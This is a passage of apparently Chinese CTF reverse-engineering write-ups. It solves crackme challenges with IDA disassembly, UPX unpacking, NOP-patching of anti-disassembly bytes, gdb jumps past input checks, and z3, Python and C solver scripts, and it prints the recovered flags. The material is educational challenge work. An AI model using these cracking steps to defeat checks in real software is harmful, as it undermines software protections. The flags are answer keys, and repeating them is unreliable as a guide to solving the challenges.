.text:000000000040160D cdqe .text:000000000040160F mov ecx, [rbp+rax*4-0B0h] .text:0000000000401616 mov edx, [rbp-14h] .text:0000000000401619 mov eax, edx .text:000000000040161B add eax, eax .text:000000000040161D add eax, edx .text:000000000040161F add eax, eax .text:0000000000401621 mov edx, eax .text:0000000000401623 mov eax, [rbp-18h] .text:0000000000401626 add eax, edx .text:0000000000401628 cdqe .text:000000000040162A mov eax, [rbp+rax*4-140h] .text:0000000000401631 cmp ecx, eax .text:0000000000401633 jz short loc_40163C .text:0000000000401635 mov dword ptr [rbp-4], 0 在cmp命令处打断点，查看ecx和eax寄存器的值，发现是拿计算结果和v11-v46进行比较\n随后查看第一个大循环，关键点显然是乘法\n.text:000000000040159E imul ecx, eax 打上断点后，发现是拿输入的6*6矩阵和104-125这段由36个数字构成的矩阵进行乘法\nstep 4：进行求解 所以接下来只需要求解矩阵即可，这里还是使用了z3\nfrom z3 import * s = Solver() f = [ Int(\u0026#39;f%d\u0026#39; % i) for i in range(36) ] for i in range(36): s.add(f[i] \u0026gt; 0x20) s.add(f[i] \u0026lt; 0x7f) s.add(f[ 0] == ord(\u0026#39;h\u0026#39;)) s.add(f[ 1] == ord(\u0026#39;g\u0026#39;)) s.add(f[ 2] == ord(\u0026#39;a\u0026#39;)) s.add(f[ 3] == ord(\u0026#39;m\u0026#39;)) s.add(f[ 4] == ord(\u0026#39;e\u0026#39;)) s.add(f[ 5] == ord(\u0026#39;{\u0026#39;)) s.add(f[35] == ord(\u0026#39;}\u0026#39;)) a = [104, 103, 97, 109, 101, 123, 64, 95, 70, 65, 75, 69, 95, 102, 108, 97, 103, 33, 45, 100, 111, 95, 89, 48, 117, 95, 107, 111, 110, 119, 95, 83, 77, 67, 63, 125] for c in a: print(chr(c), end=\u0026#39;\u0026#39;) print() ans = [55030, 61095, 60151, 57247, 56780, 55726, 46642, 52931, 53580, 50437, 50062, 44186, 44909, 46490, 46024, 44347, 43850, 44368, 54990, 61884, 61202, 58139, 57730, 54964, 48849, 51026, 49629, 48219, 47904, 50823, 46596, 50517, 48421, 46143, 46102, 46744] for i in range(6): for j in range(6): s.add(f[6 * i] * a[j] + f[6 * i + 1] * a[6 + j] + f[6 * i + 2] * a[12 + j] + f[6 * i + 3] * a[18 + j] + f[6 * i + 4] * a[24 + j] + f[6 * i + 5] * a[30 + j] == ans[6 * i + j]) if s.check() == sat: model = s.model() for i in range(36): print (chr(model[f[i]].as_long().real), end=\u0026#39;\u0026#39;) print(\u0026#39;\\nfinish\u0026#39;) # hgame{E@sy_Se1f-Modifying_C0oodee33} ","date":"2021-03-17T20:06:09Z","permalink":"/post/hgame2021-vernam-and-fake/","title":"HGAME2021 Vernam and FAKE"},{"content":"内涵的软件 首先使用file命令，发现exe是32位的，将其拖入ida中\n进入main函数\n点击进入main0函数\n可以看到一串v2字符串\n结合程序运行时出现的文字：”这里本来应该是答案的“\n猜测v2就是答案\n直接提交\n发现不对\n将开头修改为flag\n提交后直接通过\n新年快乐 首先使用file命令查看exe文件信息，发现是32位\n尝试运行发现是要求输入flag\n拖入ida进行静态分析\n发现只有一个start函数，ida各种报错，无法分析\n猜测使用了upx壳\n使用exeinfope软件进行查看，upx壳实锤\n脱壳后再次拖入ida\n发现v4为\u0026quot;HappyNewYear!\u0026quot;\n对于输入v5，直接与v4进行strncmp的比较\n因此只需要与v4相同即可\n尝试后发现没问题\n套上flag提交\n成功\nguessgame 使用软件，发现是一个猜数游戏\n拖入ida分析\n发现整个代码与flag没有任何关系，就是一个猜测随机数的游戏\n于是猜测flag隐藏在字符串常量中\n进入字符串常量最顶部，发现如下字符串：\nBJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}\n即为flag\nhelloword 下载后发现是apk文件\n首先将apk后缀更改为zip\n解压后发现文件夹中含有一个classes.dex文件\n使用dex2jar软件将其转换为jar文件\n使用jd-gui.jar对其进行逆向分析\n在源代码中有com.example.helloword文件夹，用过Java的都知道com.example是什么东西，因此进入该目录下，发现有个MainActivity.class文件，查看源代码，发现有个flag字符串并对其使用了一个比较方法(compareTo)，猜测这个就是需要的flag，提交后发现正确\nxor 拖入ida进行静态分析，发现对输入进行了异或处理，处理结果符合某个特定的函数值即可求解\n看到一个for循环，是对每个字符与前面一个字符进行异或\n根据异或的性质可知，只需要再异或一次就能还原\n所以从后往前进行异或\n随便写个脚本计算一下：\n#include \u0026lt;stdio.h\u0026gt; int main(){ char flag[35]; flag[0] = \u0026#39;f\u0026#39;; flag[1] = \u0026#39;\\n\u0026#39;; flag[2] = \u0026#39;k\u0026#39;; flag[3] = \u0026#39;\\f\u0026#39;; flag[4] = \u0026#39;w\u0026#39;; flag[5] = \u0026#39;\u0026amp;\u0026#39;; flag[6] = \u0026#39;O\u0026#39;; flag[7] = \u0026#39;.\u0026#39;; flag[8] = \u0026#39;@\u0026#39;; flag[9] = \u0026#39;\\x11\u0026#39;; flag[10] = \u0026#39;x\u0026#39;; flag[11] = \u0026#39;\\r\u0026#39;; flag[12] = \u0026#39;Z\u0026#39;; flag[13] = \u0026#39;;\u0026#39;; flag[14] = \u0026#39;U\u0026#39;; flag[15] = \u0026#39;\\x11\u0026#39;; flag[16] = \u0026#39;p\u0026#39;; flag[17] = \u0026#39;\\x19\u0026#39;; flag[18] = \u0026#39;F\u0026#39;; flag[19] = \u0026#39;\\x1F\u0026#39;; flag[20] = \u0026#39;v\u0026#39;; flag[21] = \u0026#39;\u0026#34;\u0026#39;; flag[22] = \u0026#39;M\u0026#39;; flag[23] = \u0026#39;#\u0026#39;; flag[24] = \u0026#39;D\u0026#39;; flag[25] = \u0026#39;\\x0E\u0026#39;; flag[26] = \u0026#39;g\u0026#39;; flag[27] = 6; flag[28] = \u0026#39;h\u0026#39;; flag[29] = \u0026#39;\\x0F\u0026#39;; flag[30] = \u0026#39;G\u0026#39;; flag[31] = \u0026#39;2\u0026#39;; flag[32] = \u0026#39;O\u0026#39;; flag[33] = 0; for (int i = 32; i \u0026gt;= 1; --i) { flag[i] ^= flag[i - 1]; } printf(\u0026#34;%s\u0026#34;, flag); return 0; } // flag{QianQiuWanDai_YiTongJiangHu} reverse3 进行初步检查后拖入ida进行静态分析\n发现对于输入内容使用了一个函数进行变换\n查看字符串发现使用了一个\u0026quot;ABCD\u0026hellip;+/=\u0026ldquo;的字符串，猜测使用了BASE64编码\n回到主函数，发现使用了一个str2与base64后的结果进行比较\n查看字符串可知：str2=e3nifIH9b_C@n@dH\n明显不是base64的结果\n回到主函数发现对base64结果进行了加法操作\n编程进行反向操作后得到：e2lfbDB2ZV95b3V9\n使用在线工具可得解码结果：{i_l0ve_you}\n套上flag提交，通过\n不一样的flag 首先测试一下软件\n发现好像是个前进后退的游戏\n猜测是一个迷宫\n进入ida静态分析\n发现当v8[x]==35时为成功v8[x]==49时失败\n查阅ASCII发现35对应#，49对应1因此查找同时含有这两个字符的字符串：\n*11110100001010000101111#\n总长度为24，与5*v4+v5的最大值一致，因此忽略-41\n要求是不能进入1的位置而到达#\n因此进行简单的推导即可得到要求的序列（完全可以写个代码跑一下，但由于这个题比较简单，直接手算即可）\n得到输入序列：222441144222\n套上flag提交即可\n注：此题可以看作是一个5*5的迷宫：\n* 1 1 1 1 0 1 0 0 0 0 1 0 1 0 0 0 0 1 0 1 1 1 1 # 1是障碍，0是可以走的路，*是起点，#是重点\n这样就与运行程序时的 up, down, left, right 对应上了\nSimpleRev 拖入ida\n发现这道题涉及到类型转换，需要将int转换为char插入到字符串后面\n需要注意的是在转换时要把顺序倒过来\n转换后text为killshadow，key为ADSFKNDCLS\n随后将key转换为小写字母，即adsfkndcls\n编程枚举求解\nint main{ char text[25]; strcpy(text, \u0026#34;killshadow\u0026#34;); char key[25]; strcpy(key, \u0026#34;adsfkndcls\u0026#34;); char str2[25]; int textlen = strlen(text); for (int i = 0; i \u0026lt; textlen; ++i) { for (char c = \u0026#39;A\u0026#39;; c \u0026lt;= \u0026#39;z\u0026#39;; ++c) { if (c \u0026lt;= 96 || c \u0026gt; 122) { if (c \u0026gt; 64 \u0026amp;\u0026amp; c \u0026lt;= 90) { if(text[i] == (c - 39 - key[i] + 97) % 26 + 97) { printf(\u0026#34;%d%c \u0026#34;, i, c); } } } else { if(text[i] == (c - 39 - key[i] + 97) % 26 + 97) { printf(\u0026#34;%d%c \u0026#34;, i, c); } } } } return 0; } 每个位置均可以算出两个解，一个是大写字母，一个是小写字母\n全部挑选大写字母后提交，可以通过\n想尝试一下其它组合方案是否也可以，但可惜提交平台不允许多次提交\nJava逆向解密 将.class文件拖入jd-gui.jar中进行逆向\n可以得到Reverse.class源代码：\nimport java.util.ArrayList; import java.util.Scanner; public class Reverse { public static void main(String[] args) { Scanner s = new Scanner(System.in); System.out.println(\u0026#34;Please input the flag ); String str = s.next(); System.out.println(\u0026#34;Your input is ); System.out.println(str); char[] stringArr = str.toCharArray(); Encrypt(stringArr); } public static void Encrypt(char[] arr) { ArrayList\u0026lt;Integer\u0026gt; Resultlist = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; arr.length; i++) { int result = arr[i] + 64 ^ 0x20; Resultlist.add(Integer.valueOf(result)); } int[] KEY = { 180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65 }; ArrayList\u0026lt;Integer\u0026gt; KEYList = new ArrayList\u0026lt;\u0026gt;(); for (int j = 0; j \u0026lt; KEY.length; j++) KEYList.add(Integer.valueOf(KEY[j])); System.out.println(\u0026#34;Result:\u0026#34;); if (Resultlist.equals(KEYList)) { System.out.println(\u0026#34;Congratulations); } else { System.err.println(\u0026#34;Error); } } } 这段代码就是将输入的每个字符加64后与0x20进行异或\n因此使用python进行暴力破解（其实完全可以反向计算就出来的，当时大意了）\nkey = [180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65] for k in key: for c in range(0x21, 0x80): if (c + 64) ^ 0x20 == k: print chr(c) # This_is_the_flag_! [WUSTCTF2020]Crossfun 拖入ida，发现有个判断函数，里面对输入的每个字符进行了判断，把所有判断函数整合起来，就得到flag了\nflag: wctf2020{cpp_@nd_r3verse_@re_fun}\n[WUSTCTF2020]level1 拖入ida\nstream = fopen(\u0026#34;flag\u0026#34;, \u0026#34;r\u0026#34;); fread(ptr, 1uLL, 0x14uLL, stream); fclose(stream); for ( i = 1; i \u0026lt;= 19; ++i ) { if ( i \u0026amp; 1 ) printf(\u0026#34;%ld\\n\u0026#34;, (unsigned int)(ptr[i] \u0026lt;\u0026lt; i)); else printf(\u0026#34;%ld\\n\u0026#34;, (unsigned int)(i * ptr[i])); } 显然 ptr 里面就是flag\n看到 output.txt 里面正好有19行\n对其进行逆变换（注意0）\nptr = [0, 198, 232, 816, 200, 1536, 300, 6144, 984, 51200, 570, 92160, 1200, 565248, 756, 1474560, 800, 6291456, 1782, 65536000] flag = \u0026#39;\u0026#39; for i in range(1, 20): if i % 2 == 1: flag += chr(ptr[i] \u0026gt;\u0026gt; i) else: flag += chr(ptr[i] // i) print (flag) 得到flag ctf2020{d9-dE6-20c}\n[WUSTCTF2020]level2 先使用upx进行脱壳\nupx -d attachment 进入main函数\n还没来得及按 tab 前就看到了flag\n; __unwind { lea ecx, [esp+4] and esp, 0FFFFFFF0h push dword ptr [ecx-4] push ebp mov ebp, esp push ecx sub esp, 14h mov [ebp+var_C], offset flag ; \u0026quot;wctf2020{Just_upx_-d}\u0026quot; sub esp, 0Ch push offset aWhereIsIt ; \u0026quot;where is it?\u0026quot; call puts add esp, 10h mov eax, 0 mov ecx, [ebp+var_4] leave lea esp, [ecx-4] retn ; } // starts at 804887C 这件事情告诉我们还是要看汇编代码的\nflag{Just_upx_-d}\n[WUSTCTF2020]level3 首先尝试运行程序，发现是一个base64编码程序\n进行测试后看到程序中输出一个字符串 Is there something wrong?\n推测这个base64可能不正确\n使用在线工具测试后发现大写字母出现错误\n查看base64_table字符串，发现没有问题，说明源代码中有对字符串进行操作的部分\n查看源代码，发现一个函数是 O_OLootAtYou\nfor ( i = 0; i \u0026lt;= 9; ++i ) { v0 = base64_table[i]; base64_table[i] = base64_table[19 - i]; result = 19 - i; base64_table[result] = v0; } 主函数中说有一个奇怪的字符串，显然是用错误的加密得到的结果\n对其进行更正后解密\nimport base64 str = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; table = [] for c in str: table.append(c) for i in range(10): c = table[i] table[i] = table[19 - i] table[19 - i] = c crypto = \u0026#34;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==\u0026#34; msg = \u0026#34;\u0026#34; for i in range(len(crypto)): if ord(crypto[i]) \u0026gt;= ord(\u0026#39;A\u0026#39;) and ord(crypto[i]) \u0026lt;= ord(\u0026#39;Z\u0026#39;): for j in range(26): if table[j] == crypto[i]: msg += chr(j + ord(\u0026#39;A\u0026#39;)) else: msg += crypto[i] print (msg) print (base64.b64decode(msg)) 运行得到flag为 wctf2020{Base64_is_the_start_of_reverse}\n[WUSTCTF2020]level4 运行一下程序，发现这道题和结构体有关\n拖入ida\n看到主函数中输出的是type1和type2函数的结果\n查看type1和type2\nif ( a1 ) { type1(*((_QWORD *)a1 + 1)); putchar(*a1); result = type1(*((_QWORD *)a1 + 2)); } if ( a1 ) { type2(*((_QWORD *)a1 + 1)); type2(*((_QWORD *)a1 + 2)); result = putchar(*a1); } 明显是二叉树的中序遍历和后序遍历\n反推出前序遍历，得到flag: wctf2020{This_IS_A_7reE}\n[WUSTCTF2020]funnyre 拖入ida后，通过start函数进入main\n发现main函数未定义，按p创建函数后F5，查看代码\n看到一串如下代码：\nv7 = 0LL; do *(_BYTE *)(v6 + v7++ + 5) ^= 0x91u; // 每一项异或0x91  while ( v7 != 32 ); 除此之外，还有一些错误代码标红\n以及JUMPOUT函数\n例如：\nJUMPOUT(1, (char *)\u0026amp;loc_400B81 + 1); JUMPOUT(0, (char *)\u0026amp;loc_400B81 + 1); v89 = MEMORY[0xFFFFFFFF81003D16](v6); JUMPOUT(v91, (char *)\u0026amp;loc_400B88 + 2); *(_DWORD *)((unsigned int)(v89 - 1065138106) - 125LL) += v92; *(_BYTE *)(a3 - 15) \u0026amp;= BYTE1(v90); 经过学习后发现JUMPOUT函数是经典花指令，需要patch去除\n.text:0000000000400607 loc_400607: ; CODE XREF: main+64↓j .text:0000000000400607 xor byte ptr [rdx+rax+5], 91h .text:000000000040060C add rax, 1 .text:0000000000400610 cmp rax, 20h .text:0000000000400614 jnz short loc_400607 .text:0000000000400616 jz short near ptr loc_40061A+1 .text:0000000000400618 jnz short near ptr loc_40061A+1 .text:000000000040061A .text:000000000040061A loc_40061A: ; CODE XREF: main+66↑j .text:000000000040061A ; main+68↑j .text:000000000040061A call near ptr 0FFFFFFFF810037AFh .text:000000000040061F jz short near ptr loc_400621+2 .text:0000000000400621 发现40061A这个位置其实被跳过了\n将这个位置的数据变为90（即nop）\n\r\n按c将其转换回汇编代码\n得到正确代码\n.text:0000000000400616 jz short loc_40061B .text:0000000000400618 jnz short loc_40061B .text:000000000040061A nop .text:000000000040061B .text:000000000040061B loc_40061B: ; CODE XREF: main+66↑j .text:000000000040061B ; main+68↑j .text:000000000040061B nop .text:000000000040061C xor eax, eax .text:000000000040061E .text:000000000040061E loc_40061E: ; CODE XREF: main+7B↓j .text:000000000040061E xor byte ptr [rdx+rax+5], 0CDh .text:0000000000400623 add rax, 1 .text:0000000000400627 cmp rax, 20h .text:000000000040062B jnz short loc_40061E .text:000000000040062D xor eax, eax .text:000000000040062F 在ida汇编模式中将后面几个标红的部分进行同样的修改，随后再F5即可查看到正确的代码\n找到函数结尾\nif ( memcmp(v5 + 5, \u0026amp;unk_4025C0, 0x20uLL) ) JUMPOUT(\u0026amp;loc_4005BB); 发现unk字符串，将其进行如上函数的逆变换，即可得到最终结果\n我选择的方法是复制到vscode然后利用快捷键进行快速复制，最终得到答案\n代码如下：\nres = [0xD9, 0x2C, 0x27, 0xD6, 0xD8, 0x2A, 0xDA, 0x2D, 0xD7, 0x2C, 0xDC, 0xE1, 0xDB, 0x2C, 0xD9, 0xDD, 0x27, 0x2D, 0x2A, 0xDC, 0xDB, 0x2C, 0xE1, 0x29, 0xDA, 0xDA, 0x2C, 0xDA, 0x2A, 0xD9, 0x29, 0x2A] add = [80, 64, 79, 30, 91, 9, 5, 99, 87, 83, 59, 58, 1, 90, 57, 65, 53, 41, 85, 89, 44, 70, 12, 84, 10, 74, 17, 38, 43, 33, 11, 94, 86, 55, 32, 97, 68, 50, 67, 71, 96, 56, 6, 73, 52, 42, 61, 69, 14, 75, 4, 40, 37, 15, 77, 2, 23, 62, 29, 49, 47, 27, 66, 82, 46, 19, 88, 63, 39, 35, 25, 51, 18, 92, 95, 3, 72, 48, 36, 93, 76, 22, 98, 81, 13, 45, 34, 78, 26, 54, 28, 31, 20, 16, 7, 24, 60, 21, 8] xor1 = [0xF9, 0xA9, 0x4E, 0xD3, 0xC7, 0xE2, 0xD2, 0x33, 0xA8, 0x96, 0xBD, 0xC, 0x13, 0x2F, 0x73, 0x65, 0x9C, 0x12, 2, 0x32, 0x10, 0x84, 0xED, 0x95, 0x4D, 0x75, 0x2C, 0x5D, 0x39, 0x18, 0x4C, 0x49, 0x37, 0xF0, 0x99, 0x41, 0x86, 0x76, 0xF5, 5, 0xC8, 0x64, 0xFA, 0x50, 0x3B, 8, 0xE9, 0x23, 0xC3, 0x68, 0x67, 0xff, 0x7D, 0x9D, 0x1D, 0xDA, 0xD8, 0xEB, 0xF6, 0xE3, 0x98, 0xE1, 0x34, 0x82, 0x7F, 0xD5, 0xE7, 0xB8, 0xDC, 0x97, 0xA3, 7, 0xB6, 0xB, 0x14, 0xCE, 0x66, 0x62, 0xEF] # 中间有一个0xff，对应这取反的那个循环 for i in range(len(res)): for j in add: res[i] -= j res[i] %= 256 for i in range(len(res)): for j in xor1: res[i] ^= j for i in range(len(res)): res[i] += 128 res[i] %= 256 xor2 = [0x91, 0xCD, 0x6A, 0x59, 0xA, 0xF3, 0xCA, 0x3E, 0x6C, 0x4F, 0x24, 0x83, 0xC4, 0x53, 4, 0x9E, 0x42, 0xE, 0x8D, 0x38, 0x7A, 0xDD, 0x52, 0x1B, 0xAA, 0xAE, 0xF8, 0x58, 0xF2, 0x9F, 0x3C, 0xA1, 6, 0x78, 0x70, 0x28, 0xEA, 0x48, 0xE4, 0x6E, 0x40, 0x89, 0x16, 0xD7, 0xB5, 0xD, 0x17, 0x5A, 0xB1, 0x69, 0x5C, 0x21, 0xE5, 0x7E, 0x2A, 0x94, 0xBC, 1, 0x74, 0x57, 0x6D, 0x1E, 0xA2, 0x6B, 0x22, 0xC2, 0x3D, 0x44, 0x90, 0x8C, 0xB3, 0xA6, 0x79, 0x61, 0xD9, 0x5B, 0x1A, 0x43, 0x8F, 0xA5, 0xEE, 0x25, 0x46, 0xE6, 0x88, 0x20, 0x71, 0xE8, 9, 0x8A, 0x7B, 0xB4, 0x19, 0x15, 0x4A, 0x47, 0xDB, 0x72, 0x5F, 0x26, 0xA7, 0x8B, 0xBA, 0xBF, 0x87, 0x36, 0x3F, 0xFE, 0x77, 0x1C, 0x81, 0x11, 0x2E, 0x7C, 0x63, 0x45, 0xF4, 0x56, 0xF1, 0xB0, 0xD1, 0xE0, 0xF, 0x93, 0xD6, 0x1F, 0xCC, 0x4B, 0xCF, 0xDF, 0x55, 0xB9, 0x2B, 0x85, 0x31, 0x29, 0xFD, 0x3A, 0x5E, 0xDE, 3, 0xC6, 0xC1, 0xC5, 0x54, 0xBB, 0xFC, 0xBE, 0xEC, 0xC0, 0xAD, 0xA4, 0xD0, 0x35, 0xB7, 0x51, 0xAB, 0x2D, 0xAF, 0x92, 0x60, 0xAC, 0x30, 0xD4, 0xCB, 0x9B, 0x9A, 0xFB, 0x6F, 0xF7, 0x8E, 0xA0, 0x27, 0xC9] for i in range(len(res)): for j in xor2: res[i] ^= j print(chr(res[i]), end=\u0026#39;\u0026#39;) print () 得到 flag: 1dc20f6e3d497d15cef47d9a66d6f1af\n[GUETCTF2019]re 先upx脱壳\n然后拖入ida\n找到关键字符串\n进入函数\n发现是对每一位进行乘法然后判断\n直接扔到python里算一下，发现 a[6] 缺失，以及有一位算不出来，可能出现了溢出\n用c语言把这一位算出来，得到是 a\n对第7位进行暴力破解，发现1可以，得到flag\nx = [ 1629056, 6771600, 3682944, 10431000, 3977328, 5138336, 7532250, 5551632, 3409728, 13013670, 6088797, 7884663, 8944053, 5198490, 4544518, 10115280,3645600, 9667504, 5364450, 13464540, 5488432, 14479500, 6451830, 6252576, 7763364, 7327320, 8741520, 8871876, 4086720, 9374400, 5759124 ] a = [ 166163712 , 731332800 , 357245568 , 1074393000, 489211344 , 518971936 , 406741500 , 294236496 , 177305856 , 650683500, 298351053, 386348487, 438258597, 249527520, 445362764, 981182160, 174988800, 493042704, 257493600, 767478780, 312840624, 140451150, 316139670, 619005024, 372641472, 373693320, 498266640, 452465676, 208422720, 515592000, 719890500 ] for i in range(len(x)): if (a[i] % x[i] == 0): print (chr(a[i] // x[i]), end=\u0026#39;\u0026#39;) else: print (\u0026#39;\\n\u0026#39;, i) print (\u0026#39;\\nfinish\u0026#39;) 输出为\nflag{e65421110ba03099 21 1c039337} finish flag: flag{e165421110ba03099a1c039337}\n再写个c把这一位算一下（其实不如直接用c暴力破解了）\n#include \u0026lt;stdio.h\u0026gt; int main(){ char x; for (x = 0x21; x \u0026lt; 0x7f; x++){ if (14479500 * x == 1404511500){ printf(\u0026#34;%c\\n\u0026#34;, x); } } printf(\u0026#34;finish\\n\u0026#34;); return 0; } [GUETCTF2019]number game 先拖入ida进行静态分析，查看main函数核心代码\n__isoc99_scanf(\u0026#34;%s\u0026#34;, \u0026amp;v5, a3); if ( (unsigned int)check_input((const char *)\u0026amp;v5) )// 长度为10且只能是\u0026#34;01234\u0026#34;  { v3 = sub_400758((__int64)\u0026amp;v5, 0, 10); sub_400807((__int64)v3, (__int64)\u0026amp;v7); v9 = 0; sub_400881((char *)\u0026amp;v7); // v7 = \u0026#34;0421421430\u0026#34;  if ( (unsigned int)sub_400917() ) { puts(\u0026#34;TQL!\u0026#34;); printf(\u0026#34;flag{\u0026#34;, \u0026amp;v7); printf(\u0026#34;%s\u0026#34;, \u0026amp;v5); puts(\u0026#34;}\u0026#34;); } else { puts(\u0026#34;your are cxk!!\u0026#34;); } } 输入的字符串需要通过两个if语句\n先看第一个if语句对应的函数\nif ( strlen(a1) == 10 ) { for ( i = 0; i \u0026lt;= 9; ++i ) { if ( a1[i] \u0026gt; 52 || a1[i] \u0026lt;= 47 ) { puts(\u0026#34;Wrong!\u0026#34;); return 0LL; } } result = 1LL; } else { puts(\u0026#34;Wrong!\u0026#34;); result = 0LL; } 这是对输入数据的简单要求，要求是10个0-4自成的字符串\n再查看第二个if中的函数\nv1 = 1 for ( i = 0; i \u0026lt;= 4; ++i ) { for ( j = 0; j \u0026lt;= 4; ++j ) { for ( k = j + 1; k \u0026lt;= 4; ++k ) { if ( *((_BYTE *)\u0026amp;unk_601060 + 5 * i + j) == *((_BYTE *)\u0026amp;unk_601060 + 5 * i + k) ) v1 = 0; if ( *((_BYTE *)\u0026amp;unk_601060 + 5 * j + i) == *((_BYTE *)\u0026amp;unk_601060 + 5 * k + i) ) v1 = 0; } } } 要求在某条件下unk_601060中的两个字符不相同\n再查看一下中间的几个函数\n先查看 sub_400881 函数\n__int64 __fastcall sub_400881(char *a1) { __int64 result; // rax  byte_601062 = *a1; byte_601067 = a1[1]; byte_601069 = a1[2]; byte_60106B = a1[3]; byte_60106E = a1[4]; byte_60106F = a1[5]; byte_601071 = a1[6]; byte_601072 = a1[7]; byte_601076 = a1[8]; result = (unsigned __int8)a1[9]; byte_601077 = a1[9]; return result; } 是将a1中的数据放到指定的内存位置上\n查看这个内存地址\ndata:0000000000601060 unk_601060 db 31h ; 1 .data:0000000000601061 db 34h ; 4 .data:0000000000601062 byte_601062 db 23h ; DATA XREF: sub_400881+F↑w .data:0000000000601063 db 32h ; 2 .data:0000000000601064 db 33h ; 3 .data:0000000000601065 db 33h ; 3 .data:0000000000601066 db 30h ; 0 .data:0000000000601067 byte_601067 db 23h ; DATA XREF: sub_400881+1D↑w .data:0000000000601068 db 31h ; 1 .data:0000000000601069 byte_601069 db 23h ; DATA XREF: sub_400881+2B↑w .data:000000000060106A db 30h ; 0 .data:000000000060106B byte_60106B db 23h ; DATA XREF: sub_400881+39↑w .data:000000000060106C db 32h ; 2 .data:000000000060106D db 33h ; 3 .data:000000000060106E byte_60106E db 23h ; DATA XREF: sub_400881+47↑w .data:000000000060106F byte_60106F db 23h ; DATA XREF: sub_400881+55↑w .data:0000000000601070 db 33h ; 3 .data:0000000000601071 byte_601071 db 23h ; DATA XREF: sub_400881+63↑w .data:0000000000601072 byte_601072 db 23h ; DATA XREF: sub_400881+71↑w .data:0000000000601073 db 30h ; 0 .data:0000000000601074 db 34h ; 4 .data:0000000000601075 db 32h ; 2 .data:0000000000601076 byte_601076 db 23h ; DATA XREF: sub_400881+7F↑w .data:0000000000601077 byte_601077 db 23h ; DATA XREF: sub_400881+8D↑w .data:0000000000601078 db 31h ; 1 发现与 unk_601060 对应\n说明这个程序是将输入数据填到指定内存上，然后判断是否符合某个特殊条件\n由于总共有25个字符，并且程序中出现了形如 5 * i + j 的值，以及题目名称 number_game 推测是一种类似数独的填数游戏，每行每列数字只能为01234且不能重复\n查看已有的数字\n14 23 30 1 0 23 3 0 42 1 那么最后v7中应该为 0421421430\n简单查看了 sub_400758 和 sub_400807 后，确定这两个函数只进行了顺序的转换，只要得知其结果就可以\n因此使用gdb进行动态调试，目的是找到这两个函数的顺序调换结果\n首先 start 运行程序\ngdb-peda$ start 在 0x40a62 处打上断点（输入后，第一个if前）\ngdb-peda$ b *0x400a62 运行，并输入 0123456789\n接下来需要绕过第一个if判断\n在调用函数前修改eip，直接跳到jz后面\ngdb-peda$ set var $rip=0x400a76 接下来需要查看两个函数运行后的值，这个值是 sub_400881 的参数，因此在call这个函数前打上断点，并查看 rdi 寄存器的结果即可\ngdb-peda$ b *0x400aae Breakpoint 3 at 0x400aae gdb-peda$ c Continuing. [----------------------------------registers-----------------------------------] RAX: 0x7ffffffedf40 RBX: 0x400b20 --\u0026gt; 0x41ff894156415741 RCX: 0xe RDX: 0x7ffffffedf40 RSI: 0x7ffffffedf40 RDI: 0x7ffffffedf40 RBP: 0x7ffffffedf60 RSP: 0x7ffffffedf20 RIP: 0x400aae --\u0026gt; 0xb8fffffdcee8 R8 : 0x6033d0 --\u0026gt; 0x36 (\u0026#39;6\u0026#39;) R9 : 0x7c (\u0026#39;|\u0026#39;) R10: 0x4003ce --\u0026gt; 0x5f00636f6c6c616d (\u0026#39;malloc\u0026#39;) R11: 0x7fffff78bbe0 --\u0026gt; 0x6033e0 --\u0026gt; 0x0 R12: 0x4005e0 --\u0026gt; 0x89485ed18949ed31 R13: 0x7ffffffee050 R14: 0x0 R15: 0x0 EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x400aa3: mov BYTE PTR [rbp-0x16],0x0 0x400aa7: lea rax,[rbp-0x20] 0x400aab: mov rdi,rax =\u0026gt; 0x400aae: call 0x400881 0x400ab3: mov eax,0x0 0x400ab8: call 0x400917 0x400abd: test eax,eax 0x400abf: je 0x400afc Guessed arguments: arg[0]: 0x7ffffffedf40 [------------------------------------stack-------------------------------------] Invalid $SP address: 0x7ffffffedf20 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 3, 0x0000000000400aae in ?? () 注意到 RDI: 0x7ffffffedf40\n因此查看这个内存地址下的值即可\ngdb-peda$ x/2x 0x7ffffffedf40 0x7ffffffedf40: 0x3530343931383337 0x0000000000003632 根据小端模式\n0123456789 被转换为 7381940526\n根据这个信息将 0421421430 还原，得到 1134240024\n运行程序\n$ ./number_game 1134240024 TQL! flag{1134240024} [GUETCTF2019]encrypt 拖入ida，查看主函数\nprintf(\u0026#34;please input your flag:\u0026#34;, a2, v19); scanf(\u0026#34;%s\u0026#34;, \u0026amp;s); memset(\u0026amp;v9, 0, 0x408uLL); sub_4006B6(\u0026amp;v9, (__int64)\u0026amp;v10, 8); v3 = strlen(\u0026amp;s); sub_4007DB(\u0026amp;v9, (__int64)\u0026amp;s, v3); v4 = strlen(\u0026amp;s); sub_4008FA((__int64)\u0026amp;s, v4, v19, \u0026amp;v6); for ( i = 0; i \u0026lt;= 50; ++i ) { if ( v19[i] != byte_602080[i] ) { puts(\u0026#34;Wrong\u0026#34;); return 0LL; } } puts(\u0026#34;Good\u0026#34;); 在进行判断前执行了三个函数\n最后一个函数是一个类base64\nwhile ( v20 \u0026lt; a2 ) { v4 = v20++; v17 = *(_BYTE *)(v4 + a1); if ( v20 \u0026gt;= a2 ) { v6 = 0; } else { v5 = v20++; v6 = *(_BYTE *)(v5 + a1); } v18 = v6; if ( v20 \u0026gt;= a2 ) { v8 = 0; } else { v7 = v20++; v8 = *(_BYTE *)(v7 + a1); } v9 = v8; v10 = v19; v11 = v19 + 1; a3[v10] = ((v17 \u0026gt;\u0026gt; 2) \u0026amp; 0x3F) + 61; v12 = v11++; a3[v12] = ((((v18 \u0026amp; 0xFF) \u0026gt;\u0026gt; 4) | 16 * v17) \u0026amp; 0x3F) + 61; a3[v11] = ((((v9 \u0026amp; 0xFF) \u0026gt;\u0026gt; 6) | 4 * v18) \u0026amp; 0x3F) + 61; v13 = v11 + 1; v19 = v11 + 2; a3[v13] = (v9 \u0026amp; 0x3F) + 61; } if ( a2 